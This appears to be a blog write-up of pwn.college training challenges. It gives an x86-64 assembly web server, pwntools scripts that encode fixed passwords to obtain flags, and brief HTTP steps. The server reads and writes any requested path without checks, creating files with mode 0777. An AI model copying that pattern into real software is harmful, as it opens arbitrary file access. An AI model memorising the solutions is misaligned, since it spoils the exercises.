class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">.section</span> .text</span><br><span class="line"><span class="symbol">_start:</span>     </span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">2</span>      # socket(AF_INET, SOCK_STREAM,IPPROTO_IP)=<span class="number">3</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">41</span> </span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">3</span>      # bind(<span class="number">3</span>, &#123;sa_family=AF_INET, sin_port=htons(<span class="number">80</span>), sin_addr=inet_addr(<span class="string">&quot;0.0.0.0&quot;</span>)&#125;, <span class="number">16</span>) = <span class="number">0</span></span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rsi</span>, [<span class="built_in">rip</span>+socket_addr]</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">16</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">49</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">3</span>      # listen(<span class="number">3</span>, <span class="number">0</span>) = <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">50</span></span><br><span class="line">    <span class="keyword">syscall</span> </span><br><span class="line"><span class="symbol">loop_accept:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">3</span>      # accept(<span class="number">3</span>, NULL, NULL) = <span class="number">4</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">43</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">57</span>     # fork()</span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r8</span>, <span class="built_in">rax</span></span><br><span class="line">	<span class="keyword">cmp</span> <span class="built_in">r8</span>, <span class="number">0</span></span><br><span class="line">	<span class="keyword">jne</span> parent_process</span><br><span class="line">	<span class="keyword">cmp</span> <span class="built_in">r8</span>, <span class="number">0</span></span><br><span class="line">	<span class="keyword">je</span> child_process</span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">child_process:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">3</span>      # close(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">3</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">4</span>      # read(<span class="number">4</span>,buf,count_bytes)</span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rsi</span>, buffer</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">512</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r15</span>, <span class="built_in">rax</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">al</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [buffer]</span><br><span class="line">    <span class="keyword">cmp</span> <span class="built_in">al</span>, <span class="string">&#x27;P&#x27;</span></span><br><span class="line">    <span class="keyword">je</span> post_request</span><br><span class="line">    <span class="keyword">cmp</span> <span class="built_in">al</span>, <span class="string">&#x27;G&#x27;</span></span><br><span class="line">    <span class="keyword">je</span> get_request</span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">get_request:</span></span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rsi</span>, buffer+<span class="number">4</span></span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rdi</span>, file_path_get</span><br><span class="line"><span class="symbol">loop_start_get:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">al</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rsi</span>]</span><br><span class="line">    <span class="keyword">cmp</span> <span class="built_in">al</span>, <span class="string">&#x27; &#x27;</span></span><br><span class="line">    <span class="keyword">je</span> get_file_path_get</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rdi</span>], <span class="built_in">al</span></span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">rdi</span></span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">rsi</span></span><br><span class="line">    <span class="keyword">jmp</span> loop_start_get</span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">get_file_path_get:</span></span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rdi</span>, file_path_get # open</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">2</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">3</span>              # read</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="built_in">rsp</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">256</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">syscall</span> </span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r8</span>, <span class="built_in">rax</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">3</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">3</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">4</span>      # write(<span class="number">4</span>, <span class="string">&quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span>, <span class="number">19</span>) = <span class="number">19</span></span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rsi</span>,[<span class="built_in">rip</span> + ret_normal_msg] </span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">19</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">4</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="built_in">rsp</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="built_in">r8</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>,<span class="number">0</span>       # SYS_exit</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>,<span class="number">60</span></span><br><span class="line">    <span class="keyword">syscall</span>    </span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">post_request:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r10</span>, <span class="built_in">rax</span></span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rsi</span>, buffer+<span class="number">5</span></span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rdi</span>, file_path</span><br><span class="line"><span class="symbol">loop_start_post:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">al</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rsi</span>]</span><br><span class="line">    <span class="keyword">cmp</span> <span class="built_in">al</span>, <span class="number">0x20</span></span><br><span class="line">    <span class="keyword">je</span> get_file_path_post</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rdi</span>], <span class="built_in">al</span></span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">rdi</span></span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">rsi</span></span><br><span class="line">    <span class="keyword">jmp</span> loop_start_post</span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">get_file_path_post:</span></span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rdi</span>, file_path  # open(<span class="string">&quot;file_path&quot;</span>, O_WRONLY|O_CREAT, <span class="number">0777</span>)</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">01</span>|<span class="number">0100</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">0x1FF</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">2</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r12</span>, <span class="number">8</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r8</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r9</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rsi</span>, buffer</span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rdi</span>, content</span><br><span class="line"><span class="symbol">loop2_start_post:</span></span><br><span class="line">    <span class="keyword">cmp</span> <span class="built_in">r8</span>, <span class="built_in">r12</span></span><br><span class="line">    <span class="keyword">jge</span> get_content</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">al</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rsi</span>]</span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">r9</span></span><br><span class="line">    <span class="keyword">cmp</span> <span class="built_in">al</span>, <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    <span class="keyword">je</span> get_index </span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">rsi</span></span><br><span class="line">    <span class="keyword">jmp</span> loop2_start_post</span><br><span class="line"><span class="symbol">get_index:</span></span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">r8</span></span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">rsi</span></span><br><span class="line">    <span class="keyword">jmp</span> loop2_start_post</span><br><span class="line"><span class="symbol">get_content:</span></span><br><span class="line">    <span class="keyword">sub</span> <span class="built_in">r15</span>, <span class="built_in">r9</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">3</span>      # write(<span class="number">3</span>, content, content_length)</span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rsi</span>, buffer</span><br><span class="line">    <span class="keyword">add</span> <span class="built_in">rsi</span>, <span class="built_in">r9</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="built_in">r15</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">3</span>      # close(<span class="number">3</span>) = <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">3</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">4</span>      # write(<span class="number">4</span>, <span class="string">&quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span>, <span class="number">19</span>) = <span class="number">19</span></span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rsi</span>,[<span class="built_in">rip</span> + ret_normal_msg] </span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">19</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>,<span class="number">0</span>       # SYS_exit</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>,<span class="number">60</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">parent_process:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">4</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">3</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line">    <span class="keyword">jmp</span> loop_accept</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">.section</span> .data</span><br><span class="line"><span class="symbol">socket_addr:</span></span><br><span class="line"><span class="meta">    .2byte</span> <span class="number">2</span></span><br><span class="line"><span class="meta">    .2byte</span> <span class="number">0x5000</span></span><br><span class="line"><span class="meta">    .4byte</span> <span class="number">0</span></span><br><span class="line"><span class="meta">    .8byte</span> <span class="number">0</span></span><br><span class="line"><span class="symbol">ret_normal_msg:</span></span><br><span class="line"><span class="meta">    .ascii</span> <span class="string">&quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span></span><br><span class="line"><span class="symbol">buffer:</span></span><br><span class="line"><span class="meta">    .space</span> <span class="number">512</span></span><br><span class="line"><span class="symbol">file_path:</span></span><br><span class="line"><span class="meta">    .space</span> <span class="number">64</span> </span><br><span class="line"><span class="symbol">file_path_get:</span></span><br><span class="line"><span class="meta">    .space</span> <span class="number">64</span></span><br><span class="line"><span class="symbol">content:</span></span><br><span class="line"><span class="meta">    .space</span> <span class="number">256</span></span><br><span class="line"><span class="symbol">reverse_content:</span></span><br><span class="line"><span class="meta">    .space</span> <span class="number">256</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="Playing-With-Programs"><a href="#Playing-With-Programs" class="headerlink" title="Playing With Programs"></a>Playing With Programs</h2><h3 id="Dealing-with-Data"><a href="#Dealing-with-Data" class="headerlink" title="Dealing with Data"></a>Dealing with Data</h3><h4 id="10-Encoding-Practice"><a href="#10-Encoding-Practice" class="headerlink" title="10. Encoding Practice"></a>10. Encoding Practice</h4><p>pwntools 的API说明：<a target="_blank" rel="noopener" href="https://gist.github.com/anvbis/64907e4f90974c4bdd930baeb705dedf">Pwntools Cheatsheet</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">s</span>):</span><br><span class="line">    s = u64(s, endianness=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(s)</span><br><span class="line">    binary = <span class="built_in">bin</span>(s).replace(<span class="string">&#x27;0b&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> binary</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;/challenge/runme&quot;</span>)</span><br><span class="line"></span><br><span class="line">correct_password = <span class="string">b&quot;\x96\x92\xa9\xd6\xec\x83\xe3\xba&quot;</span></span><br><span class="line">correct_password = encode(correct_password)</span><br><span class="line"><span class="built_in">print</span>(correct_password)</span><br><span class="line">p.write(correct_password)</span><br><span class="line"><span class="built_in">print</span>(p.readall())</span><br></pre></td></tr></table></figure>

<h4 id="11-Hex-encoding-Practice"><a href="#11-Hex-encoding-Practice" class="headerlink" title="11. Hex-encoding Practice"></a>11. Hex-encoding Practice</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">correct_password = <span class="string">b&quot;hveetgwy&quot;</span></span><br><span class="line">correct_password = enhex(correct_password)</span><br><span class="line"><span class="built_in">print</span>(correct_password)</span><br></pre></td></tr></table></figure>

<h4 id="12-Nested-Encoding"><a href="#12-Nested-Encoding" class="headerlink" title="12. Nested Encoding"></a>12. Nested Encoding</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;/challenge/runme&#x27;</span>)</span><br><span class="line">correct_password = <span class="string">b&quot;arumrhnj&quot;</span></span><br><span class="line">correct_password = enhex(correct_password)</span><br><span class="line">correct_password = correct_password.encode(<span class="string">&quot;l1&quot;</span>)</span><br><span class="line">correct_password = enhex(correct_password)</span><br><span class="line">correct_password = correct_password.encode(<span class="string">&quot;l1&quot;</span>)</span><br><span class="line">correct_password = enhex(correct_password)</span><br><span class="line">correct_password = correct_password.encode(<span class="string">&quot;l1&quot;</span>)</span><br><span class="line">correct_password = enhex(correct_password)</span><br><span class="line">correct_password = correct_password.encode(<span class="string">&quot;l1&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(correct_password)</span><br><span class="line">p.write(correct_password)</span><br><span class="line"><span class="built_in">print</span>(p.readall())</span><br></pre></td></tr></table></figure>

<h4 id="13-Hex-encoding-UTF-8"><a href="#13-Hex-encoding-UTF-8" class="headerlink" title="13. Hex-encoding UTF-8"></a>13. Hex-encoding UTF-8</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;/challenge/runme&#x27;</span>)</span><br><span class="line">correct_password = <span class="string">&quot;📐 🌍 🍗 🔵&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">correct_password = enhex(correct_password)</span><br><span class="line"><span class="built_in">print</span>(correct_password)</span><br><span class="line">p.write(correct_password)</span><br><span class="line"><span class="built_in">print</span>(p.readall())</span><br></pre></td></tr></table></figure>

<h4 id="14-UTF-Mixups"><a href="#14-UTF-Mixups" class="headerlink" title="14. UTF Mixups"></a>14. UTF Mixups</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">correct_password = <span class="string">b&quot;amoozuff&quot;</span></span><br><span class="line">correct_password = correct_password.decode(<span class="string">&quot;latin1&quot;</span>)</span><br><span class="line">correct_password = correct_password.encode(<span class="string">&quot;utf-16&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(correct_password)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;okeu&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(correct_password)</span><br></pre></td></tr></table></figure>

<h4 id="15-Modifying-Encoded-Data"><a href="#15-Modifying-Encoded-Data" class="headerlink" title="15. Modifying Encoded Data"></a>15. Modifying Encoded Data</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">correct_password = <span class="string">b&quot;\xf1~\xe6P\xc0\x9a\x1f\xa6&quot;</span></span><br><span class="line">correct_password = enhex(correct_password)</span><br><span class="line">correct_password = correct_password[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(correct_password)</span><br><span class="line">p = process(<span class="string">&#x27;/challenge/runme&#x27;</span>)</span><br><span class="line">p.write(correct_password)</span><br><span class="line"><span class="built_in">print</span>(p.readall())</span><br></pre></td></tr></table></figure>

<h4 id="16-Decoding-Base64"><a href="#16-Decoding-Base64" class="headerlink" title="16. Decoding Base64"></a>16. Decoding Base64</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">correct_password = <span class="string">b&quot;iAb/uzx0uJQ=&quot;</span></span><br><span class="line">correct_password = b64d(correct_password)</span><br><span class="line"><span class="built_in">print</span>(correct_password)</span><br><span class="line">p = process(<span class="string">&#x27;/challenge/runme&#x27;</span>)</span><br><span class="line">p.write(correct_password)</span><br><span class="line"><span class="built_in">print</span>(p.readall())</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="17-Encoding-Base64"><a href="#17-Encoding-Base64" class="headerlink" title="17. Encoding Base64"></a>17. Encoding Base64</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">correct_password = <span class="string">b&quot;\\\x0fz\xf4\xe27\xe4\xf3&quot;</span></span><br><span class="line">correct_password = b64e(correct_password)</span><br><span class="line"><span class="built_in">print</span>(correct_password)</span><br><span class="line">p = process(<span class="string">&#x27;/challenge/runme&#x27;</span>)</span><br><span class="line">p.write(correct_password)</span><br><span class="line"><span class="built_in">print</span>(p.readall())</span><br></pre></td></tr></table></figure>

<h4 id="18-Dealing-with-Obfuscation"><a href="#18-Dealing-with-Obfuscation" class="headerlink" title="18. Dealing with Obfuscation"></a>18. Dealing with Obfuscation</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">correct_password = <span class="string">b&quot;\x9c\xebn\xb4\xd1\xe5r\x05&quot;</span></span><br><span class="line">correct_password = correct_password.<span class="built_in">hex</span>().encode(<span class="string">&quot;l1&quot;</span>)</span><br><span class="line">correct_password = base64.b64encode(correct_password)</span><br><span class="line">correct_password = correct_password[::-<span class="number">1</span>]</span><br><span class="line">correct_password = correct_password.<span class="built_in">hex</span>().encode(<span class="string">&quot;l1&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(correct_password)</span><br><span class="line">p = process(<span class="string">&#x27;/challenge/runme&#x27;</span>)</span><br><span class="line">p.write(correct_password)</span><br><span class="line"><span class="built_in">print</span>(p.readall())</span><br></pre></td></tr></table></figure>

<h4 id="19-Dealing-with-Obfuscation-2"><a href="#19-Dealing-with-Obfuscation-2" class="headerlink" title="19. Dealing with Obfuscation 2"></a>19. Dealing with Obfuscation 2</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_to_bits</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;&quot;</span>.join(<span class="built_in">format</span>(c, <span class="string">&quot;08b&quot;</span>).encode(<span class="string">&quot;latin1&quot;</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br><span class="line"></span><br><span class="line">correct_password = <span class="string">b&quot;V\x04\x93\x98\x05\xd4^\r&quot;</span></span><br><span class="line">correct_password = encode_to_bits(correct_password)</span><br><span class="line">correct_password = base64.b64encode(correct_password)</span><br><span class="line">correct_password = b64e(correct_password)</span><br><span class="line">correct_password = correct_password[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(correct_password)</span><br><span class="line"></span><br><span class="line">correct_password = b64e(correct_password.encode(<span class="string">&quot;l1&quot;</span>))</span><br><span class="line">correct_password = correct_password[::-<span class="number">1</span>]</span><br><span class="line">correct_password = correct_password[::-<span class="number">1</span>]</span><br><span class="line">correct_password = b64e(correct_password.encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;/challenge/runme&#x27;</span>)</span><br><span class="line">p.write(correct_password)</span><br><span class="line"><span class="built_in">print</span>(p.readall())</span><br></pre></td></tr></table></figure>



<h3 id="Talking-Web"><a href="#Talking-Web" class="headerlink" title="Talking Web"></a>Talking Web</h3><h4 id="1-Your-First-HTTP-Request"><a href="#1-Your-First-HTTP-Request" class="headerlink" title="1. Your First HTTP Request"></a>1. Your First HTTP Request</h4><p>用GUI打开，然后命令行运行<code>/challenge/server</code>，最后浏览器打开网页，即可获得flag</p>
<h4 id="2-Reading-Flask"><a href="#2-Reading-Flask" class="headerlink" title="2. Reading Flask"></a>2. Reading Flask</h4><p>访问<code>http://challenge.localhost/access</code></p>
